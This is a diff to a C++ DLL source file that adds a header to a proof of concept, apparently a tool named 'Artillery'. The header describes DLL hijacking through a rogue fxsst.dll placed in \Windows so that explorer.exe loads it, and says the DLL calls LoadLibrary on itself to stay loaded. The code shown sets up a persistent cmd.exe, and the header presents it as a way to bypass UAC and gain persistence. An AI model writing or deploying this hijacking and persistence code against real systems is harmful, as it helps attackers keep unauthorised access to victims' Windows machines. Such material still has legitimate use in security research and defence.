@@ -1,4 +1,28 @@
-// dllmain.cpp : Defines the entry point for the DLL application.
+/*
+ * Filename: fxsst.cpp
+ *
+ * Classification:
+ * Classified By: 
+ *
+ * Tool Name: Artillery
+ * Requirement #:2022-1337
+ *
+ * Author: Hacker Fantastic
+ * Date Created:        12/30/2023
+ * Version 1.0:12/30/2023 (00:00)
+ *
+ * "This is a simple DLL hijacking attack that we have successfully 
+ * tested against Windows XP,Vista and 7. A DLL named fxsst.dll normally 
+ * resides in \Windows\System32 and is loaded by explorer.exe. Placing a 
+ * new DLL with this name in \Windows results in this being loaded into 
+ * explorer instead of the original DLL. On Windows Vista and above, the 
+ * DLL‘s reference count must be increased by calling LoadLibrary on itself 
+ * to avoid being unloaded."
+ * 
+ * This code will persist a "cmd.exe" which will be present when explorer.exe
+ * restarts or the host rebooted. This is a PoC for Artillery which is an AED
+ * example to bypass UAC and obtain persistence.
+ */
 #include "pch.h"
 #include <windows.h>
 
@@ -16,7 +40,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved
         {
             LoadLibrary(szModulePath);
         }
-        // Create a new console with cmd.exe running
+        // Create a new console with cmd.exe running - this will not have elevated rights but is persisted. 
         STARTUPINFO si;
         PROCESS_INFORMATION pi;
         ZeroMemory(&si, sizeof(si));
